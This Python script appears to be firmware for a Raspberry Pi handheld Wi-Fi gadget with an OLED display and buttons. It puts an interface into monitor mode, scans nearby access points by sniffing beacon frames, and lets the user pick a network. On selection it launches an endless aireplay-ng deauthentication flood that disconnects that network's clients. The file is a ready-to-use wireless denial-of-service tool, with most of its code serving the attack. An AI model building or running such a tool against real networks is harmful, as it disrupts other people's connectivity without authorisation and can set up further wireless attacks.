from scapy.all import *
from threading import Thread
import subprocess
import pandas
import time
import os
from gpiozero import Button
from PIL import Image, ImageDraw, ImageFont
from luma.core.interface.serial import spi
from luma.oled.device import sh1106

# initialize the networks dataframe that will contain all access points nearby
networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
# set the index BSSID (MAC address of the AP)
networks.set_index("BSSID", inplace=True)

def callback(packet):
    
    global ssid, bssid,finalssid,finalbssid,channel_changer,finalall
    if backbutton.is_pressed:
        channel_changer.daemon = False
        os.system("sudo ifconfig wlan1 down")
        
    else:
        try:
            if packet.haslayer(Dot11Beacon):

            
                # extract the MAC address of the network
                bssid = packet[Dot11].addr2
                # get the name of it
                ssid = packet[Dot11Elt].info.decode()
                try:
                    dbm_signal = packet.dBm_AntSignal
                except:
                    dbm_signal = "N/A"
                # extract network stats
                stats = packet[Dot11Beacon].network_stats()
                # get the channel of the AP
                channel = stats.get("channel")
                # get the crypto
                crypto = stats.get("crypto")
                #print(ssid, bssid)
                finalall.append((ssid,bssid,channel))
                finalssid.append(ssid)
                finalbssid.append(bssid)
                finalssid = list(dict.fromkeys(finalssid))
                finalbssid = list(dict.fromkeys(finalbssid))
                finalall = list(dict.fromkeys(finalall))
                


                networks.loc[bssid] = (ssid, dbm_signal, channel, crypto)
        except RuntimeError:
            pass





def change_channel():
    cha = 1
    while True:
        if  scaning_wifi:
            os.system(f"iwconfig {interface} channel {cha}")
            # switch channel from 1 to 14 each 0.5s
            cha = cha % 14 + 1
            time.sleep(0.5)




def main():
    global okbutton,backbutton,finalssid,finalbssid,interface,channel_changer,ch,finalch,finalall,scaning_wifi
    interface = "wlan1"
    scaning_wifi = False
    os.system(f"sudo ifconfig {interface} down")#sudo ifconfig wlan1 down
    os.system(f"sudo iwconfig {interface} mode monitor")#sudo iwconfig wlan1 mode monitor
    os.system(f"sudo ifconfig {interface} up")#sudo ifconfig wlan1 up
    ch = None
    finalch = []
    white = 255
    black = 0
    downbutton = Button(19)
    upbutton = Button(6)
    leftbutton = Button(5)
    rightbutton = Button(26)
    okbutton = Button(21)                   
    backbutton = Button(16)
    offbutton = Button(13)
    font = ImageFont.truetype("Arial.ttf", 10)
    smalfont = ImageFont.truetype("Arial.ttf", 7)
    oled = sh1106(spi(device=0, port=0, ),rotate=2)
    oled.clear()
    image1 = Image.new('1', (oled.width, oled.height))
    draw = ImageDraw.Draw(image1)
    finalssid = []
    finalbssid = []
    finalall = []
    draw.rectangle((0 ,0, 128, 64), outline=255, fill=white)
    draw.rectangle((1, 1, 126, 62), outline=0, fill=black)
    draw.text((10,10), "wifi.py", fill=white, font=font)
    draw.text((3,55), "1. 0", fill=white, font=smalfont)
    draw.text((45,20), "ok - scan wifi", fill=white, font=font)
    draw.text((45,30), "back - exit", fill=white, font=font)
    oled.display(image1)
    in_menu = True
    while True:
        if okbutton.is_pressed:
            draw.rectangle((0 ,0, 128, 64), outline=0, fill=black)
            draw.text((30,10), "scaning wifi", fill=white, font=font)
            draw.text((80,54), "back - exit", fill=white, font=font)
            oled.display(image1)
            in_menu = False
            # interface name, check using iwconfig
            
            # start the thread that prints all the networks
            #printer = Thread(target=print_all)
            #printer.daemon = True
            #printer.start()
            # start the channel changer
            channel_changer = Thread(target=change_channel)
            channel_changer.daemon = True
            channel_changer.start()
            scaning_wifi = True
            try: 
                sniff(prn=callback, iface=interface)
            except RuntimeError:
                pass
            print("end")
            backbutton.wait_for_release()
            scaning_wifi = False
            y_pointer = 0
            print(finalall)
            draw.rectangle((0 ,0, 128, 64), outline=0, fill=black)
            draw.text((0,10), finalssid[y_pointer], fill=white, font=font)
            draw.text((0,30), "all networks "+ str(len(finalssid)), fill=white, font=font)
            oled.display(image1)
            while True:
                
                
                if upbutton.is_pressed:
                    if y_pointer == len(finalssid)-1:
                        y_pointer = len(finalssid)-2
                    else:
                        print(len(finalssid)-1, y_pointer)
                        y_pointer = y_pointer + 1
                        draw.rectangle((0 ,0, 128, 64), outline=0, fill=black)
                        try:
                            draw.text((0,10), finalssid[y_pointer], fill=white, font=font)
                            draw.text((0,30), "all networks "+ str(len(finalssid)), fill=white, font=font)
                        except IndexError:
                            y_pointer = 0
                            print("error")
                            draw.text((0,10), finalssid[y_pointer], fill=white, font=font)
                            draw.text((0,30), "all networks "+ str(len(finalssid)), fill=white, font=font)
                            oled.display(image1)
                        downbutton.wait_for_release()
                        time.sleep(0.3)
                        print("up")
                        print(y_pointer)
                        oled.display(image1)
                elif downbutton.is_pressed:
                    if y_pointer == 0:
                        y_pointer = 0
                        draw.rectangle((0 ,0, 128, 64), outline=0, fill=black)
                        draw.text((0,10), finalssid[y_pointer], fill=white, font=font)
                        draw.text((0,30), "all networks "+ str(len(finalssid)), fill=white, font=font)
                    else:
                        y_pointer = y_pointer - 1
                        draw.rectangle((0 ,0, 128, 64), outline=0, fill=black)
                        draw.text((0,10), finalssid[y_pointer], fill=white, font=font)
                        draw.text((0,30), "all networks "+ str(len(finalssid)), fill=white, font=font)
                        oled.display(image1)
                        
                        upbutton.wait_for_release()
                        print("down")
                        print(y_pointer)
                        time.sleep(0.3)
                        oled.display(image1)
                elif backbutton.is_pressed:
                    in_menu = True
                    break
                elif okbutton.is_pressed:
                    assid,abssid,ach = finalall[y_pointer]
                    os.system(f"iwconfig {interface} channel {ach}")
                    draw.rectangle((0 ,0, 128, 64), outline=0, fill=black)
                    draw.text((20,10), "deauthnig", fill=white, font=font)
                    draw.text((0,30), f"{assid} at {ach}", fill=white, font=font)
                    deauth = subprocess.Popen(['aireplay-ng', '-0','0','-a', abssid, interface]) # aireplay-ng -0 0 -a bssid wlan1
                    oled.display(image1)
                    backbutton.wait_for_press()
                    deauth.kill()
        elif backbutton.is_pressed and in_menu:
                downbutton.close()
                upbutton.close()
                leftbutton.close()
                rightbutton.close()
                okbutton.close()                   
                backbutton.close()
                offbutton.close()
                break
if __name__ == "__main__":
    main()